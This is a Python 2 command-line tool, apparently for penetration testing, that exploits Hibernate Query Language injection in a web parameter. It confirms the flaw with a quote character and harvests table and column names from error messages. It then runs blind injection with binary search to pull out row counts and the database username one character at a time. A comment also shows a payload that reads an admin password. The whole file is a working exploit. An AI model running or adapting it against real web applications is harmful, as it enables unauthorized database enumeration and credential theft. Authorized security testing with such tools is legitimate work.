import urlparse
from bs4 import BeautifulSoup
from math import *
import urllib
import optparse
import requests
import sys
import json
import re

COOKIE = ""
TABLES = {}
VERBOSE_MODE = False

def send_HTTP_request(url, params):
    global COOKIE

    # Create HTTP headers
    headers = {'cookie': COOKIE}

    url = url + '?' + urllib.urlencode(params)
    req = requests.get(url, headers=headers)
    return req

def check_if_host_vulnerable(url, params, param_to_test):
    params[param_to_test] = "'"

    req = send_HTTP_request(url, params)
    if ('org.hibernate.QueryException' in req.content):
        print "Host seems vulnerable."
    else:
        raise Exception('No Query Exception in the HTTP response.')

def list_columns(url, params, param_to_test):

    global TABLES
    columns = []
    params[param_to_test] = "' and test=1 and ''='"

    req = send_HTTP_request(url, params)
    if ('not found; SQL statement' in req.content):
        # pattern for the columns
        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
        for res in re.findall(pattern, req.content):
            table_name = res[1]
            column_name = res[2]

            insert_table_name_in_tables(table_name)
            insert_column_in_table(table_name, column_name)
    else:
        raise Exception('We cannot manage to retrieve columns.')
    

def column_exists(message):
    if ('not found; SQL statement:' in message):
        return False
    else:
        if ('could not resolve property:' in message):
            return False
        return True

def table_exists(message):
    if ('is not mapped' in message):
        return False
    else:
        return True

def enumerate_tables_and_columns():
    global TABLES

    display_message("[-] Enumerating extracted information")
    for table in TABLES:
        print "[" + table + "]"
        for column in TABLES[table]:
            print "\t" + column

def remove_new_line_from_string(string, char=''):
    return string[:-1] + char

def blind_hqli_injection_tables(url, params, param_to_test, file_table, blind_hqli_message):
    global TABLES

    tables_to_test = []
    with open(file_table) as f:
        tables_to_test = f.readlines()

    # removing new line
    for table in tables_to_test:
        table = remove_new_line_from_string(table)
        find_table(url, params, param_to_test, table)

def find_table(url, params, param_to_test, table_name):
    params[param_to_test] = "'and (select test from " + table_name + " where test = 1) >= 'p' or ''='"
    req = send_HTTP_request(url, params)
    if (table_exists(req.content)):
        insert_table_name_in_tables(table_name)
    else:
        display_message("[-] Table " + table_name + " does not exist.")            

def blind_hqli_injection_columns(url, params, param_to_test, file_column, blind_hqli_message):
    global TABLES

    columns_to_test = []
    with open(file_column) as f:
        columns_to_test = f.readlines()

    for table in TABLES:
        for column in columns_to_test:
            # removing new line
            column = remove_new_line_from_string(column)
            params[param_to_test] = "'and (select count(w." + column + ") from " + table + " w) >= 0 or ''='"
            
            req = send_HTTP_request(url, params)
            if (column_exists(req.content)):
                insert_column_in_table(table, column)
            else:
                display_message("[-] Column " + column + " does not exist.")            

def get_dbms_username(url, params, param, message):
    global TABLES

    try:
        table_to_test = TABLES.items()[0][0]
    except:
        raise Exception('No tables found ?')    
    
    #get the count of the table
    request = "' and (SELECT count(*) FROM " + table_to_test + ") "
    count_table = retrieve_count_or_length(url, params, param, message, request)

    request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
    count_user = retrieve_count_or_length(url, params, param, message, request)

    display_message("Count table : " + count_table)
    display_message("Count User : " + count_user)

    i = len(str(count_table)) + 2
    username_str = ""
    while (i <= int(count_user)):
        request = "' and (SELECT substring(CONCAT(COUNT(*), '/', USER()), " + str(i) + ", 1) FROM " + table_to_test + ") "
        char = int(retrieve_count_or_length(url, params, param, message, request, True))
        username_str = username_str + chr(char)
        i = i + 1

    print "Username of Database found : " + username_str


def get_count_of_tables(url, params, param, message):
    global TABLES

    for table in TABLES:
        get_count_of_table(url, params, param, message, table)

def get_count_of_table(url, params, param_to_test, message, name_table):

    request = "' and (SELECT count(*) FROM " + name_table + ") "
    count = retrieve_count_or_length(url, params, param_to_test, message, request)

    print "[!] Count(*) of " + name_table + " : " + str(count)


def retrieve_count_or_length(url, params, param_to_test, message, request, isChar=False):
    inf = 0
    sup = 10

    while (inf != sup):

        inf_str = '{:g}'.format(inf)
        sup_str = '{:g}'.format(sup)

        if (isChar):
            params[param_to_test] = request + " = CHAR(" + inf_str + ") or ''='"    
        else:
            params[param_to_test] = request + " = " + inf_str + " or ''='"    
        
        req = send_HTTP_request(url, params)

        if (message in req.content):
            break
    
        if (isChar):
            params[param_to_test] = request + " >= CHAR(" + sup_str + ") or ''='"
        else:
            params[param_to_test] = request + " >= " + sup_str + " or ''='"

        req = send_HTTP_request(url, params)

        if (message in req.content):
            inf = sup
            sup = (2 * inf)
        else:
            sup = sup - floor((sup-inf)/2)

    return '{:g}'.format(inf)


def insert_table_name_in_tables(table_name):
    global TABLES

    #First letter in uppercase
    table_name = table_name.title()
    if (table_name not in TABLES):
        print "[!] Table " + table_name + " has been found."
        TABLES[table_name] = []
    else:
        display_message("[-] Table " + table_name + " has been found (again).")

def insert_column_in_table(table_name, column_name):
    global TABLES

    #First letter in uppercase
    table_name = table_name.title()
    column_name = column_name.title()
    
    if (table_name not in TABLES):
        raise Exception('This might be a problem with ' + table_name)

    if (column_name not in TABLES[table_name]):
        TABLES[table_name].append(column_name)
        print "[!] Column " + column_name + " has been found in table " + table_name
    else:
        display_message("[-] Column " + column_name + " has been found in table " + table_name + " (again)")


def display_message(message):
    global VERBOSE_MODE
    if (VERBOSE_MODE):
        print message

# Blind SQLi
# http://localhost:9110/ropeytasks/task/search?q=%27and%20%28select%20substring%28password,1,1%29%20from%20User%20where%20username=%27admin%27%29%20%3E=%20%27p%27or%20%27%27=%27&search=Search
# 'and (select substring(password,1,1) from User where username='admin') >= 'p'or ''='
#SELECT COUNT(*) FROM   INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='TABLE';

# option parser
parser = optparse.OptionParser()
parser.add_option('--url', help='qURL to pentest', dest='url')
parser.add_option('--param', help='Param to test', dest='param')
parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default=None)
parser.add_option('--blind', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
parser.add_option('--table_name_file', help='Name for tables', dest='file_table', default='db/tables.db')
parser.add_option('--column_name_file', help='Name for columns', dest='file_column', default='db/columns.db')
parser.add_option('--fingerprinting', help='Gathers information by doing fingerprinting', dest='fingerprinting', default=False, action='store_true')
parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')

# TODO: Check for mandatory parameters
# mandatory params to check
# mandatory_params = ['url', 'param']

if (len(sys.argv) <= 2):
    parser.print_help()
else:
    (opts, args) = parser.parse_args()
    # Setting cookie and verbose mode
    COOKIE = opts.cookie
    VERBOSE_MODE = opts.verbose

    # check for param
    params = opts.url.split('?')[1]
    params = dict( (k, v if len(v)>1 else v[0] ) 
           for k, v in urlparse.parse_qs(params).iteritems() )
    # print params
    # raw_input()
    if (opts.param not in params):
        raise Exception('Param not in URL!')

    url = opts.url.split('?')[0]
    check_if_host_vulnerable(url, params, opts.param)

    # list columns
    list_columns(url, params, opts.param)

    # check if blind hql injection must be done
    if (opts.blind_hqli_message is not None):
        blind_hqli_injection_tables(url, params, opts.param, opts.file_table, opts.blind_hqli_message)
        blind_hqli_injection_columns(url, params, opts.param, opts.file_column, opts.blind_hqli_message)

        if (opts.fingerprinting):
            get_count_of_tables(url, params, opts.param, opts.blind_hqli_message)
            get_dbms_username(url, params, opts.param, opts.blind_hqli_message)

    # enumerate tables and columns found if flag passed
    if (opts.results):
        enumerate_tables_and_columns()